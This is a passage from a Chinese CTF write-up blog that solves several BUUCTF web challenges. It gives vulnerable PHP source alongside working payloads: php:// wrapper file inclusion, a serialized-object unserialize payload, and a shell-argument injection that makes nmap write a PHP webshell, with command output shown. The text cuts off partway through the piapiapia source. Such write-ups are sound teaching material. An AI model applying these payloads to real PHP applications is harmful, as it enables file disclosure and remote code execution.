application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 28</span><br><span class="line"></span><br><span class="line">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure><p>发现身份验证不通过，看到 Cookie ，改成 1 ；绕过 <code>is_numeric</code> 加 </p><p><code>%23</code> ; 传完又提示 money 长度过长，数组绕过。</p><h3 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> 伪协议post数据： <code>php://input</code> ;</p><p><code>include($file);</code> 这里包含了一个文件并且提示文件名字，我们再用另一个伪协议读一下文件内容：</p><p><code>php://filter/convert.base64-encode/resource=useless.php</code></p><p>*注：只有一个 <code>include()</code> 即可使用伪协议将文件内容包含出来</p><p>将得到内容解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>现在的 url ：<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>伪协议 <code>?file=php://filter/convert.base64-encode/resource=index.php</code> 读一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">exit(&apos;hacker!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>哦，然后直接读 <code>flag.php</code></p><h3 id="Online-Tool"><a href="#Online-Tool" class="headerlink" title="Online Tool"></a>Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>百度到文章</p><p>我们编写示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = <span class="string">"127.0.0.1' -v -d a=1"</span>;</span><br><span class="line">$ep = escapeshellarg($param);</span><br><span class="line">$eep = escapeshellcmd($ep);</span><br><span class="line">$cmd = <span class="string">"curl "</span>.$eep;</span><br><span class="line"><span class="keyword">echo</span> $ep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $eep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $cmd.<span class="string">"\n"</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line"><span class="string">'127.0.0.1'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">'</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">curl '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line"><span class="string">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class="line"><span class="string">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br></pre></td></tr></table></figure><p>可以看到我们输入 <code>127.0.0.1&#39; -v -d a=1</code> 后，经过 <code>escapeshellarg()</code> 转义变成<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code> 。</p><p> <code>&#39;</code> 被转义为 <code>\&#39;</code> ,被隔开的两部分分别左右两端加上一对 <code>&#39;&#39;</code> 然后连接在一起；</p><p> 然后经过 <code>escapeshelcmd()</code> 后，变成了 <code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>, 可以看到上一步留下的 <code>\</code> 再次被转义成 <code>\\</code> ，这时就只表示 <code>\</code> ，不起转义作用，于是 <code>127.0.0.1</code> 单独成组，紧跟 <code>\</code> ，后面两个单引号单独成组 <code>&#39;&#39;</code> ，只剩下结尾的一个 <code>&#39;</code> 被转义 <code>\&#39;</code> </p><p>最后执行的命令就变成了 <code>curl &#39;127.0.0.1&#39;\ -v -d a=1&#39;</code> , 请求的是 <code>127.0.0.1\</code> , POST的数据是 <code>a=1&#39;</code> .</p><p>回到题目可以看到使用的是 <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,而通过查看 nmap 手册发现输出命令，我们试一下</p><p><code>nmap 127.0.0.1 -oN 1.php</code> </p><p>查看 1.php 内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.0000060s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap <span class="keyword">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure><p>有了上面的知识后，剩下的就是想办法绕过题目的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">example.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param1 = <span class="string">" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' "</span>;</span><br><span class="line">$ep = escapeshellarg($param1);</span><br><span class="line">$eep = escapeshellcmd($ep);</span><br><span class="line">$cmd = <span class="string">"nmap "</span>.$eep;</span><br><span class="line"><span class="keyword">echo</span> $ep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $eep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $cmd.<span class="string">"\n"</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"> <span class="string">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class="line"><span class="string">' '</span>\<span class="string">''</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls`;<span class="meta">?&gt;</span> -oN <span class="number">1.</span>php <span class="string">'\''</span> <span class="string">'</span></span><br><span class="line"><span class="string">'</span> <span class="string">'\\'</span><span class="string">' \&lt;\?php echo \`ls\`\;\?\&gt; -oN 1.php '</span>\\<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">nmap '</span> <span class="string">'\\'</span><span class="string">' \&lt;\?php echo \`ls\`\;\?\&gt; -oN 1.php '</span>\\<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure><p>查看 1.php 可以看到执行的命令是</p><p><code>nmap -oN 1.php \ &lt;?php echo</code>ls<code>;?&gt; \\</code></p><p> 我们传入参数 <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , 加的单引号目的是为了通过单引号闭合转义加上的单引号。</p><p>需要注意的是参数后面的单引号需要隔一个空格，不然生成的文件名就会是 <code>.php\\</code> ,不能被正常解析了。 随机我们运行 1.php ,可以看到成功解析了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# php 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \ 1.php</span></span><br><span class="line">1.php\\ </span><br><span class="line">1.txt</span><br><span class="line">ctf</span><br><span class="line">dc-2.txt</span><br><span class="line">escapeshellarg.php</span><br><span class="line">index.php~</span><br><span class="line">pickle1.py</span><br><span class="line">shell-7.x-1.0-beta5.zip</span><br><span class="line">shell.py</span><br><span class="line">snippet.py</span><br><span class="line">test.php</span><br><span class="line">th.jpeg</span><br><span class="line">top6000.txt</span><br><span class="line"> \\</span><br><span class="line">Failed to resolve "\".</span><br><span class="line">Failed to resolve "&lt;?php".</span><br></pre></td></tr></table></figure><p>对于本题，可以传入</p><p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p><h3 id="piapiapia"><a href="#piapiapia" class="headerlink" title="piapiapia"></a>piapiapia</h3><p>扫描目录得到源码</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">'hostname'</span>],</span><br><span class="line">$config[<span class="string">'username'</span>], </span><br><span class="line">$config[<span class="string">'password'</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// \|\\\\</span></span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;class.php&apos;);</span><br><span class="line">if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">die(&apos;Login First&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line">if($profile  == null) &#123;</span><br><span class="line">header(&apos;Location: update.php&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[&apos;phone&apos;];</span><br><span class="line">$email = $profile[&apos;email&apos;];</span><br><span class="line">$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class="line">&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>update.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 